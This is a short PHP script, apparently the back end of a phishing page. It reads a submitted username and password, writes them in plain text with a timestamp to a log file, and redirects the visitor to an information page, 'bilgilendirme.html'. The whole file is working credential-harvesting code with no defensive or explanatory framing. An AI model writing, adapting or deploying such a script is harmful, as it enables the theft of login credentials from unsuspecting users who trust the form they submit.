<?php
$username = $_POST['username'];
$password = $_POST['password'];
$date = date("Y-m-d H:i:s");

$file = fopen("log.txt", "a");
fwrite($file, "Username: $username | Password: $password | Date: $date\n");
fclose($file);

header("Location: bilgilendirme.html");
exit();
?>

